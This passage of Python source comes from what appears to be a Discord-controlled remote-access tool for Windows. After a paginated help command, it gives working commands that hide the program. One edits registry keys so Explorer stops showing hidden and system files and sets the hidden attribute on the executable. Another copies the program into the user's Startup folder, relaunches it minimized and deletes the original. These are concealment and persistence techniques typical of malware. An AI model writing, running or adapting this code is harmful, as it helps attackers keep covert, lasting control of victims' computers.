    commands_on_page = commands_list[start_index:end_index]

    embed = discord.Embed(
        title="Available Commands",
        description="List of all commands",
        color=0x007BFF
    )

    for command in commands_on_page:
        embed.add_field(
            name=command.name,
            value=command.help if command.help else "No description provided",
            inline=False
        )

    embed.set_footer(text=f"Page {page}/{max_page}")

    message = await ctx.send(embed=embed)

    if max_page > 1:
        await message.add_reaction("◀️")
        await message.add_reaction("▶️")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["◀️", "▶️"] and reaction.message.id == message.id

    while True:
        try:
            reaction, user = await bot.wait_for("reaction_add", check=check)
            await message.remove_reaction(reaction, user)
            
            if str(reaction.emoji) == "◀️" and page > 1:
                page -= 1
            elif str(reaction.emoji) == "▶️" and page < max_page:
                page += 1
            
            start_index = (page - 1) * per_page
            end_index = start_index + per_page
            commands_on_page = commands_list[start_index:end_index]

            embed.clear_fields()
            for command in commands_on_page:
                embed.add_field(
                    name=command.name,
                    value=command.help if command.help else "No description provided",
                    inline=False
                )
            
            embed.set_footer(text=f"Page {page}/{max_page}")

            await message.edit(embed=embed)

        except asyncio.TimeoutError:
            break

@bot.command(help="Hides the script file and disables show hidden files (windows doesn't allow autostarting hidden files so be carefull).")
async def hidescript(ctx):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
        winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(reg_key)
        script_path = sys.executable
        os.system(f'attrib +h "{script_path}"')
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Makes this script execute on logon (only user that ran this file, startup programs dont start if hidden, hence the now seperate command).")
async def startup(ctx):
    try:
        ## Modify registry to show hidden files and folders
        #reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
        #winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
        #winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
        #winreg.CloseKey(reg_key)
        
        # Determine script path
        if os.path.basename(sys.executable).lower() == "python.exe":
            script_path = __file__  # Use __file__ if running from Python interpreter
        else:
            script_path = sys.executable  # Use sys.executable if running from compiled executable
        
        # Copy script to startup folder
        startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        
        script_name = os.path.basename(script_path)
        destination_path = os.path.join(startup_folder, script_name)
    
        shutil.copy(script_path, destination_path)
    
        print(f"Script '{script_name}' moved to the startup folder.")
        await ctx.send(f"Moved '{script_name}' to the startup folder.")
        
        # Make the copied script hidden
        #os.system(f'attrib +h "{destination_path}"')
        
        # Prepare the command to start the script from the startup folder without console window
        if script_path.endswith('.py') or script_path.endswith('.pyw'):
            startup_command = f'cmd /C start /MIN pythonw "{destination_path}" & del "{script_path}"'
        else:
            startup_command = f'start /MIN "" "{destination_path}" & del "{script_path}"'
        
        # Start the script from the startup folder without waiting for it to finish
        subprocess.Popen(startup_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        
        # Notify and exit gracefully
        await ctx.send("Script started on startup successfully.")
        sys.exit()

    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Force stops the bot.")
async def estop(ctx):
    await ctx.send("Force stopping bot...")
    await bot.close()
    os._exit(0)

try:
    bot.run(TOKEN)
except discord.errors.LoginFailure:
    exit("\n\033[91mError: Invalid bot token.\033[0m")